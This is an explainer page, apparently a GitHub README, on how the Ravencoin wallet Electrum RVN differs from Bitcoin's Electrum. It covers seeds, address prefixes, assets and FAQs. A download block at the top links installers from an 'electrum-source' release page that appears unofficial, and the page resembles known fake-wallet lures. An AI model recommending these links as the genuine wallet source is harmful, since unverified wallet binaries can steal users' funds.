![Electrum RVN](assets/banner-article.png)

# Is Electrum RVN a Bitcoin Wallet? What It Actually Runs On

<!-- compact-download-block -->

<p align="center">Why a Bitcoin seed opens an empty wallet here</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
No. Electrum RVN is a Ravencoin wallet. It borrows the Electrum client model - a light client that talks to servers instead of downloading a chain - but it runs on the Ravencoin network, holds Ravencoin's coin, sends to Ravencoin addresses, and understands Ravencoin's native assets. Nothing in it touches Bitcoin.

## Why the name makes people ask

"Electrum" is a client design before it is a product name. Bitcoin's Electrum established the pattern: a small desktop application, a twelve-word seed, a wallet file, servers that answer questions about your addresses instead of a full chain on disk. Ravencoin's own wallet line took the same pattern, which is why the words look familiar and why a reader arriving from a Bitcoin guide recognises the screens.

What carries over is the shape of the software: seed handling, the encrypted wallet file, the server list, the Receive and Send tabs, Replace-By-Fee. What does not carry over is the ledger. A wallet is only a set of keys plus a way to read one chain, and this wallet reads Ravencoin's.

## What actually differs

| | Electrum RVN | Bitcoin's Electrum |
| --- | --- | --- |
| Chain | Ravencoin | Bitcoin |
| Coin | RVN | BTC |
| Address prefix | `R`, base58 | `1`, `3` or `bc1` |
| Block time | 1 minute | a longer target |
| Native assets | yes - named, sub, unique, restricted | no |
| Seed format | BIP-39, twelve words | BIP-39, twelve words |
| Client model | light client over Electrum servers | light client over Electrum servers |

The seed format is the one place the two are genuinely identical, and it is also the most dangerous similarity: a twelve-word phrase from a Bitcoin wallet will import into many wallets and restore nothing, because the keys it derives belong to a different chain. A seed is not a universal key; it is a key to one network's addresses.

## Can I use a Bitcoin seed in this wallet?

You can type the words in, and the wallet will derive Ravencoin addresses from them, and they will be empty - unless those same words were also used to receive RVN. The reverse is true as well: an Electrum RVN seed entered into a Bitcoin wallet produces Bitcoin addresses, not your RVN. If you hold both, keep two wallets and two records of which seed is which; [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) explains how to label one so this never becomes a guessing game.

## What Ravencoin is, in the terms that matter here

Ravencoin is its own proof-of-work chain with one-minute blocks, a 2,500 RVN block reward and a 21 billion cap, mined with KAWPOW - an algorithm chosen to resist ASICs. Its distinguishing feature is a native asset layer: named assets, sub-assets, unique single-issue assets, restricted and reissuable assets, all first-class objects on the chain rather than contracts deployed by a third party. Bitcoin has nothing equivalent at the protocol level, which is why a Bitcoin wallet cannot hold an RVN asset and this wallet can.

If the asset layer is new to you, [what is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md) is the short version: named, sub, unique and restricted assets are all objects on the chain rather than contracts someone deployed.

## What the similarity is good for

The shared client model is why this wallet feels finished rather than improvised: the seed workflow, the wallet file, watch-only wallets, multisig, hardware signing and fee bumping are all patterns that have been tested for a decade on Bitcoin and work the same way here. If you have used Electrum for Bitcoin, you already know how to [create a wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md), and the Receive tab works the way you expect.

What you must unlearn is the assumption that any Electrum guide applies. Server lists differ, the address prefix differs, fees are priced in RVN, and the asset screens have no Bitcoin counterpart. Copying a Bitcoin guide's server address into this wallet is the most common way to end up staring at a wallet that will not connect - see [Electrum RVN will not connect to a server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md).

## Where to start instead

If you came here looking for a Bitcoin wallet, this is not it, and no setting turns it into one. If you came because you hold RVN, the path is the same as any new wallet: [install Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/install-electrum-rvn-windows-macos-linux.md), create one, write the twelve words down, and receive a small test amount before anything larger. [What is Electrum RVN?](https://github.com/electrum-source/download-and-setup/blob/main/what-is-electrum-rvn.md) is the overview if you want the whole picture first, and [other Ravencoin wallets beside Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/other-ravencoin-wallets-beside-electrum-rvn.md) covers the alternatives if you are still deciding.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

## FAQ

### Can Electrum RVN hold Bitcoin?

No. It has no Bitcoin support at all: no BTC addresses, no Bitcoin servers, no Bitcoin transactions. A wallet that offers both is a different product.

### Why does it use the Electrum name, then?

Because it is an Electrum-model client for Ravencoin - the same design, applied to a different chain. The name describes the software pattern, not the coin.

### My Bitcoin seed restored an empty wallet - did I lose the RVN?

No. If the seed never received RVN, there is nothing to restore: those words derive Ravencoin addresses that were never used. Your RVN lives under whichever seed received it.

### Does it support segwit or Lightning?

No. Those are Bitcoin features and Ravencoin has neither. The wallet's own features are the asset layer, hardware signing, multisig and cold storage.

### Can I send RVN to a Bitcoin address?

You can paste one, and the wallet will refuse it, because the address format does not validate on this network. If a service ever gives you a Bitcoin address for an "RVN" withdrawal, that is a wrong-network withdrawal and the funds do not arrive here - [Ravencoin address format in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/ravencoin-address-format-in-electrum-rvn.md) explains the check.

<!-- related-articles -->

## Related articles

- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [What Is a Ravencoin Asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md)
- [How to Create a Wallet in Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/create-a-wallet-in-electrum-rvn.md)
- [Electrum RVN Will Not Connect to a Server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md)
